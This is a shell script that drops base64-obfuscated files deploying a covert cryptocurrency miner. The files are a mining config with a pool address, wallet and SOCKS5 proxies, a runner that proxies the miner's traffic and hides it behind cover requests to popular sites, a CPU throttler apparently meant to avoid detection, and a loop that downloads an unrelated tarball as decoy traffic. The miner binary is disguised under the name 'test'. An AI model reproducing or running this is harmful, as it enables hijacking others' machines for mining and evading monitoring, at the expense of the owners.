sudo apt install -y python3-pip cpulimit
pip3 install requests psutil
chmod 777 ./test
echo 'ewogICAgImFwaSI6IHsKICAgICAgICAiaWQiOiBudWxsLAogICAgICAgICJ3b3JrZXItaWQiOiBudWxsCiAgICB9LAogICAgImh0dHAiOiB7CiAgICAgICAgImVuYWJsZWQiOiBmYWxzZSwKICAgICAgICAiaG9zdCI6ICIxMjcuMC4wLjEiLAogICAgICAgICJwb3J0IjogMCwKICAgICAgICAiYWNjZXNzLXRva2VuIjogbnVsbCwKICAgICAgICAicmVzdHJpY3RlZCI6IHRydWUKICAgIH0sCiAgICAiYXV0b3NhdmUiOiB0cnVlLAogICAgImJhY2tncm91bmQiOiBmYWxzZSwKICAgICJjb2xvcnMiOiBmYWxzZSwKICAgICJ0aXRsZSI6IHRydWUsCiAgICAicmFuZG9teCI6IHsKICAgICAgICAiaW5pdCI6IC0xLAogICAgICAgICJpbml0LWF2eDIiOiAtMSwKICAgICAgICAibW9kZSI6ICJhdXRvIiwKICAgICAgICAiMWdiLXBhZ2VzIjogZmFsc2UsCiAgICAgICAgInJkbXNyIjogdHJ1ZSwKICAgICAgICAid3Jtc3IiOiB0cnVlLAogICAgICAgICJjYWNoZV9xb3MiOiBmYWxzZSwKICAgICAgICAibnVtYSI6IHRydWUsCiAgICAgICAgInNjcmF0Y2hwYWRfcHJlZmV0Y2hfbW9kZSI6IDEKICAgIH0sCiAgICAiY3B1IjogewogICAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgICAiaHVnZS1wYWdlcyI6IHRydWUsCiAgICAgICAgImh1Z2UtcGFnZXMtaml0IjogZmFsc2UsCiAgICAgICAgImh3LWFlcyI6IG51bGwsCiAgICAgICAgInByaW9yaXR5IjogbnVsbCwKICAgICAgICAibWVtb3J5LXBvb2wiOiBmYWxzZSwKICAgICAgICAieWllbGQiOiB0cnVlLAogICAgICAgICJhc20iOiB0cnVlLAogICAgICAgICJhcmdvbjItaW1wbCI6IG51bGwsCiAgICAgICAgImFzdHJvYnd0LW1heC1zaXplIjogNTUwLAogICAgICAgICJhc3Ryb2J3dC1hdngyIjogZmFsc2UsCiAgICAgICAgImFyZ29uMiI6IFswLCAxXSwKICAgICAgICAiYXN0cm9id3QiOiBbMCwgMV0sCiAgICAgICAgImNuIjogWwogICAgICAgICAgICBbMSwgMF0sCiAgICAgICAgICAgIFsxLCAxXQogICAgICAgIF0sCiAgICAgICAgImNuLWhlYXZ5IjogWwogICAgICAgICAgICBbMSwgMF0sCiAgICAgICAgICAgIFsxLCAxXQogICAgICAgIF0sCiAgICAgICAgImNuLWxpdGUiOiBbCiAgICAgICAgICAgIFsxLCAwXSwKICAgICAgICAgICAgWzEsIDFdCiAgICAgICAgXSwKICAgICAgICAiY24tcGljbyI6IFsKICAgICAgICAgICAgWzIsIDBdLAogICAgICAgICAgICBbMiwgMV0KICAgICAgICBdLAogICAgICAgICJjbi91cHgyIjogWwogICAgICAgICAgICBbMiwgMF0sCiAgICAgICAgICAgIFsyLCAxXQogICAgICAgIF0sCiAgICAgICAgImdob3N0cmlkZXIiOiBbCiAgICAgICAgICAgIFs4LCAwXSwKICAgICAgICAgICAgWzgsIDFdCiAgICAgICAgXSwKICAgICAgICAicngiOiBbMCwgMV0sCiAgICAgICAgInJ4L3dvdyI6IFswLCAxXSwKICAgICAgICAiY24tbGl0ZS8wIjogZmFsc2UsCiAgICAgICAgImNuLzAiOiBmYWxzZSwKICAgICAgICAicngvYXJxIjogInJ4L3dvdyIsCiAgICAgICAgInJ4L2tldmEiOiAicngvd293IgogICAgfSwKICAgICJvcGVuY2wiOiB7CiAgICAgICAgImVuYWJsZWQiOiBmYWxzZSwKICAgICAgICAiY2FjaGUiOiB0cnVlLAogICAgICAgICJsb2FkZXIiOiBudWxsLAogICAgICAgICJwbGF0Zm9ybSI6ICJBTUQiLAogICAgICAgICJhZGwiOiB0cnVlCiAgICB9LAogICAgImN1ZGEiOiB7CiAgICAgICAgImVuYWJsZWQiOiBmYWxzZSwKICAgICAgICAibG9hZGVyIjogbnVsbCwKICAgICAgICAibnZtbCI6IHRydWUKICAgIH0sCiAgICAibG9nLWZpbGUiOiBudWxsLAogICAgImRvbmF0ZS1sZXZlbCI6IDEsCiAgICAiZG9uYXRlLW92ZXItcHJveHkiOiAxLAogICAgInBvb2xzIjogWwogICAgICAgIHsKICAgICAgICAgICAgImFsZ28iOiBudWxsLAogICAgICAgICAgICAiY29pbiI6IG51bGwsCiAgICAgICAgICAgICJ1cmwiOiAiMTM2LjI0My40OS4xNzc6NDQzIiwKICAgICAgICAgICAgInVzZXIiOiAiNDUxakdIOFhtUlJhYVN2cEtZTWExSkdHM3c4d0YyZUNKV1dQV1o3QlR4RXk3Y3FlWDhXWlA0VDRKZmZXbnRuU1ljOHZhazh6ZjlKaGdKRFg4N2J5M0dybzJvNVlQVloiLAogICAgICAgICAgICAicGFzcyI6IG51bGwsCiAgICAgICAgICAgICJyaWctaWQiOiBudWxsLAogICAgICAgICAgICAibmljZWhhc2giOiBmYWxzZSwKICAgICAgICAgICAgImtlZXBhbGl2ZSI6IHRydWUsCiAgICAgICAgICAgICJlbmFibGVkIjogdHJ1ZSwKICAgICAgICAgICAgInRscyI6IHRydWUsCiAgICAgICAgICAgICJ0bHMtZmluZ2VycHJpbnQiOiBudWxsLAogICAgICAgICAgICAiZGFlbW9uIjogZmFsc2UsCiAgICAgICAgICAgICJzb2NrczUiOiAiMTc0LjY0LjE5OS43OTo0MTQ1IiwKICAgICAgICAgICAgInNlbGYtc2VsZWN0IjogbnVsbCwKICAgICAgICAgICAgInN1Ym1pdC10by1vcmlnaW4iOiBmYWxzZQogICAgICAgIH0KICAgIF0sCiAgICAicmV0cmllcyI6IDUsCiAgICAicmV0cnktcGF1c2UiOiA1LAogICAgInByaW50LXRpbWUiOiA2MCwKICAgICJoZWFsdGgtcHJpbnQtdGltZSI6IDYwLAogICAgImRtaSI6IHRydWUsCiAgICAic3lzbG9nIjogZmFsc2UsCiAgICAidGxzIjogewogICAgICAgICJlbmFibGVkIjogZmFsc2UsCiAgICAgICAgInByb3RvY29scyI6IG51bGwsCiAgICAgICAgImNlcnQiOiBudWxsLAogICAgICAgICJjZXJ0X2tleSI6IG51bGwsCiAgICAgICAgImNpcGhlcnMiOiBudWxsLAogICAgICAgICJjaXBoZXJzdWl0ZXMiOiBudWxsLAogICAgICAgICJkaHBhcmFtIjogbnVsbAogICAgfSwKICAgICJkbnMiOiB7CiAgICAgICAgImlwdjYiOiBmYWxzZSwKICAgICAgICAidHRsIjogMzAKICAgIH0sCiAgICAidXNlci1hZ2VudCI6IG51bGwsCiAgICAidmVyYm9zZSI6IDAsCiAgICAid2F0Y2giOiB0cnVlLAogICAgInBhdXNlLW9uLWJhdHRlcnkiOiBmYWxzZSwKICAgICJwYXVzZS1vbi1hY3RpdmUiOiBmYWxzZQp9' | base64 --decode > ./config.json
echo 'aW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBzeXMNCmltcG9ydCBqc29uDQppbXBvcnQgb3MNCmltcG9ydCByYW5kb20NCmltcG9ydCB0aW1lDQppbXBvcnQgc2lnbmFsDQppbXBvcnQgcmVxdWVzdHMNCg0KTUlOX1RJTUVPVVQgPSA0MDANCk1BWF9USU1FT1VUID0gNjAwDQpTTEVFUF9NSU4gPSAzMA0KU0xFRVBfTUFYID0gMTgwDQpDT1JFU19OVU1CRVIgPSA0DQpMRUdJVElNQVRFX1NFUlZFUlMgPSBbImh0dHBzOi8vd3d3LmJhaWR1LmNvbS8iLCAiaHR0cHM6Ly9iYmMuY28udWsvIiwgImh0dHBzOi8vZWRpdGlvbi5jbm4uY29tLyIsICJodHRwczovL3d3dy5nb29nbGUuY29tLyIsICJodHRwczovL3lhaG9vLmNvbS8iLCAiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tLyJdDQpTT0NLUzUgPSBbIjE3NC42NC4xOTkuNzk6NDE0NSIsICI3Mi4xOTUuMzQuNTk6NDE0NSIsICI3Mi4yMTAuMjA4LjEwMTo0MTQ1Il0NCldBTExFVCA9ICI0NTFqR0g4WG1SUmFhU3ZwS1lNYTFKR0czdzh3RjJlQ0pXV1BXWjdCVHhFeTdjcWVYOFdaUDRUNEpmZldudG5TWWM4dmFrOHpmOUpoZ0pEWDg3YnkzR3JvMm81WVBWWiINCg0KZGVmIGdldFNvY2tzU2VydmVyKCk6DQogICAgcmFuZG9tLnNodWZmbGUoU09DS1M1KQ0KICAgIGZvciBzZXJ2ZXIgaW4gU09DS1M1Og0KICAgICAgICBpZiBjaGVja1NvY2tzUHJveHkoc2VydmVyKToNCiAgICAgICAgICAgIHByaW50KCI/Pz8gR290IHdvcmtpbmcgU09DS1M1IHNlcnZlciAlcyIgJXNlcnZlcikNCiAgICAgICAgICAgIHJldHVybiBzZXJ2ZXINCiAgICByZXR1cm4gTm9uZQ0KICAgIA0KZGVmIGNoZWNrU29ja3NQcm94eShwcm94eVNlcnZlcik6DQogICAgcHJveGllcyA9IHsnaHR0cCc6ICJzb2NrczU6Ly8lcyIgJXByb3h5U2VydmVyfQ0KICAgIHRyeToNCiAgICAgICAgcmVxdWVzdHMuZ2V0KCdodHRwczovL2dvb2dsZS5jb20nLCBwcm94aWVzPXByb3hpZXMsIHRpbWVvdXQgPSA1KQ0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmV0dXJuIEZhbHNlDQogICAgcmV0dXJuIFRydWUNCiAgDQpkZWYgc2VuZExlZ2l0aW1hdGVSZXF1ZXN0KCk6DQogICAgc2VydmVyX2luZGV4ID0gcmFuZG9tLnJhbmRyYW5nZShsZW4oTEVHSVRJTUFURV9TRVJWRVJTKSkNCiAgICBzZXJ2ZXIgPSBMRUdJVElNQVRFX1NFUlZFUlNbc2VydmVyX2luZGV4XQ0KICAgIHByaW50KCI/Pz8gU2VuZGluZyBhIHJlcXVlc3QgdG8gJXMiICVzZXJ2ZXIpDQogICAgcmVxdWVzdHMuZ2V0KHNlcnZlcikNCg0KZGVmIHJ1bih0ZXN0X3BhdGgsIGNvbmZpZ19maWxlKToNCiAgICByYW5kb20uc2VlZCgpDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdGltZW91dCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX1RJTUVPVVQsIE1BWF9USU1FT1VUICsgMSkNCiAgICAgICAgc2VuZExlZ2l0aW1hdGVSZXF1ZXN0KCkNCiAgICAgICAgc2xlZXAgPSByYW5kb20ucmFuZHJhbmdlKFNMRUVQX01JTiwgU0xFRVBfTUFYICsgMSkNCiAgICAgICAgc29ja3M1X3NlcnZlciA9IGdldFNvY2tzU2VydmVyKCkNCiAgICAgICAgaWYgc29ja3M1X3NlcnZlciBpcyBOb25lOg0KICAgICAgICAgICAgcHJpbnQoIiEhISBDYW5ub3QgY29ubmVjdCB0byBTT0NLUyBzZXJ2ZXJzLCBzbGVlcGluZy4uLiIpDQogICAgICAgICAgICB0aW1lLnNsZWVwKHNsZWVwKQ0KICAgICAgICAgICAgY29udGludWUNCiAgICAgICAgY29uZmlnID0ganNvbi5sb2FkKG9wZW4oY29uZmlnX2ZpbGUsICJyIikpDQogICAgICAgIGZvciBwb29sIGluIHJhbmdlKGxlbihjb25maWdbInBvb2xzIl0pKToNCiAgICAgICAgICAgIGNvbmZpZ1sicG9vbHMiXVtwb29sXVsic29ja3M1Il0gPSBzb2NrczVfc2VydmVyDQogICAgICAgICAgICBjb25maWdbInBvb2xzIl1bcG9vbF1bInVzZXIiXSA9IFdBTExFVA0KICAgICAgICBqc29uLmR1bXAoY29uZmlnLCBvcGVuKGNvbmZpZ19maWxlLCAidyIpLCBzb3J0X2tleXM9VHJ1ZSwgaW5kZW50PTQpDQogICAgICAgIHByaW50KCIhISEgUnVubmluZyBmb3IgJWQgc2VjLCB3YWl0aW5nIGZvciAlZCBzZWMsIHNvY2tzNTogJXMsIHdhbGxldDogJXNcbiIgJSh0aW1lb3V0LCBzbGVlcCwgc29ja3M1X3NlcnZlciwgV0FMTEVUKSkNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgcCA9IHN1YnByb2Nlc3MuUG9wZW4oW3Rlc3RfcGF0aCwgIi1jIiwgY29uZmlnX2ZpbGVdLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCh0aW1lb3V0KQ0KICAgICAgICAgICAgcC5zZW5kX3NpZ25hbChzaWduYWwuU0lHSU5UKQ0KICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgICAgICAgICBwLnNlbmRfc2lnbmFsKHNpZ25hbC5TSUdJTlQpDQogICAgICAgIHRyeToNCiAgICAgICAgICAgIHAud2FpdCh0aW1lb3V0PTMwKQ0KICAgICAgICAgICAgcHJpbnQoIj8/PyBQcm9jZXNzIHRlcm1pbmF0ZWQsIHNsZWVwaW5nIGZvciAlZCBzZWNvbmRzIiAlKHNsZWVwKSkNCiAgICAgICAgICAgIHRpbWUuc2xlZXAoc2xlZXApDQogICAgICAgICAgICBwLnRlcm1pbmF0ZSgpDQogICAgICAgIGV4Y2VwdCBzdWJwcm9jZXNzLlRpbWVvdXRFeHBpcmVkOg0KICAgICAgICAgICAgaWYgcC5yZXR1cm5jb2RlIGlzIE5vbmU6DQogICAgICAgICAgICAgICAgcHJpbnQoIiEhISBQcm9jZXNzIGlzIHN0aWxsIGFsaXZlIikNCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKHNsZWVwKQ0KICAgICAgICAgICAgICAgIHAudGVybWluYXRlKCkNCiAgICAgICAgDQpkZWYgbWFpbigpOg0KICAgIGlmIGxlbihzeXMuYXJndikgPCAzOg0KICAgICAgICBwcmludCgiVVNBR0U6IHRlc3QucHkgPHRlc3RfcGF0aD4gPGNvbmZpZ19maWxlPiIpDQogICAgICAgIHJldHVybg0KICAgIHRlc3RfcGF0aCA9IHN5cy5hcmd2WzFdDQogICAgY29uZmlnX2ZpbGUgPSBzeXMuYXJndlsyXQ0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyh0ZXN0X3BhdGgpOg0KICAgICAgICBwcmludCgiQ2Fubm90IGZpbmQgdGVzdCBleGVjdXRhYmxlIikNCiAgICAgICAgcmV0dXJuDQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGNvbmZpZ19maWxlKToNCiAgICAgICAgcHJpbnQoIkNhbm5vdCBmaW5kIHRlc3QgY29uZmlndXJhdGlvbiBmaWxlIikNCiAgICAgICAgcmV0dXJuDQogICAgcnVuKHRlc3RfcGF0aCwgY29uZmlnX2ZpbGUpDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0K' | base64 --decode > ./test.py
echo 'aW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHRpbWUNCmltcG9ydCBzaWduYWwNCmltcG9ydCBwc3V0aWwNCg0KTUlOX1RJTUVPVVQgPSAxMA0KTUFYX1RJTUVPVVQgPSAzMA0KTUlOX0NQVSA9IDEwDQpNQVhfQ1BVID0gOTANCkNIRUNLX1NMRUVQID0gNQ0KDQpkZWYgZ2V0UGlkQnlOYW1lKHByb2Nlc3NOYW1lKToNCiAgICAnJycNCiAgICBDaGVjayBpZiB0aGVyZSBpcyBhbnkgcnVubmluZyBwcm9jZXNzIHRoYXQgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgcHJvY2Vzc05hbWUuDQogICAgJycnDQogICAgI0l0ZXJhdGUgb3ZlciB0aGUgYWxsIHRoZSBydW5uaW5nIHByb2Nlc3MNCiAgICBmb3IgcHJvYyBpbiBwc3V0aWwucHJvY2Vzc19pdGVyKCk6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICMgQ2hlY2sgaWYgcHJvY2VzcyBuYW1lIGNvbnRhaW5zIHRoZSBnaXZlbiBuYW1lIHN0cmluZy4NCiAgICAgICAgICAgIGlmIHByb2Nlc3NOYW1lLmxvd2VyKCkgaW4gcHJvYy5uYW1lKCkubG93ZXIoKToNCiAgICAgICAgICAgICAgICByZXR1cm4gcHJvYw0KICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkLCBwc3V0aWwuWm9tYmllUHJvY2Vzcyk6DQogICAgICAgICAgICBwYXNzDQogICAgcmV0dXJuIE5vbmUNCg0KZGVmIHJ1bigpOg0KICAgIHJhbmRvbS5zZWVkKCkNCiAgICB3aGlsZSBUcnVlOg0KICAgICAgICB0cnk6DQogICAgICAgICAgICB4bXJpZ19wcm9jID0gZ2V0UGlkQnlOYW1lKCJ0ZXN0IikNCiAgICAgICAgICAgIGlmIHhtcmlnX3Byb2MgaXMgTm9uZToNCiAgICAgICAgICAgICAgICBwcmludCgiUHJvY2VzcyBpc24ndCBmb3VuZCIpDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChDSEVDS19TTEVFUCkNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgdGltZW91dCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX1RJTUVPVVQsIE1BWF9USU1FT1VUICsgMSkNCiAgICAgICAgICAgIGNwdV9saW1pdCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX0NQVSwgTUFYX0NQVSArIDEpDQogICAgICAgICAgICBwcmludCgiTGltaXRpbmcgQ1BVIHRvICVkIGZvciAlZCBzZWNvbmRzIiAlKGNwdV9saW1pdCwgdGltZW91dCkpDQogICAgICAgICAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihbImNwdWxpbWl0IiwgIi1wIiwgc3RyKHhtcmlnX3Byb2MucGlkKSwgIi1sIiwgc3RyKGNwdV9saW1pdCldLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCh0aW1lb3V0KQ0KICAgICAgICAgICAgcC5zZW5kX3NpZ25hbChzaWduYWwuU0lHSU5UKQ0KICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgICAgICAgICBwLnNlbmRfc2lnbmFsKHNpZ25hbC5TSUdJTlQpDQogICAgICAgICAgICBicmVhaw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwLndhaXQodGltZW91dD01KQ0KICAgICAgICAgICAgcHJpbnQoIj8/PyBQcm9jZXNzIHRlcm1pbmF0ZWQiKQ0KICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQ0KICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5UaW1lb3V0RXhwaXJlZDoNCiAgICAgICAgICAgIGlmIHAucmV0dXJuY29kZSBpcyBOb25lOg0KICAgICAgICAgICAgICAgIHByaW50KCIhISEgUHJvY2VzcyBpcyBzdGlsbCBhbGl2ZSIpDQogICAgICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQ0KICAgICAgICANCmRlZiBtYWluKCk6DQogICAgcnVuKCkNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigp' | base64 --decode > ./limit.py
echo 'IyEvYmluL2Jhc2gKY2QgL3RtcAp3aGlsZSB0cnVlCmRvCgkKCWN1cmwgLW8gLi90ZXN0LnRhci5neiAtTCBodHRwczovL2dpdGh1Yi5jb20vYW5ndWxhci9hbmd1bGFyL2FyY2hpdmUvcmVmcy90YWdzLzEzLjEuMC50YXIuZ3oKCXRhciAteHZmIC4vdGVzdC50YXIuZ3oKCXJtIC1yZiAqCglzbGVlcCA5MApkb25lCg==' | base64 --decode > ./run.sh
echo 'bash ./run.sh'
echo 'python3 ./limit.py'
echo 'python3 ./test.py ./test ./config.json'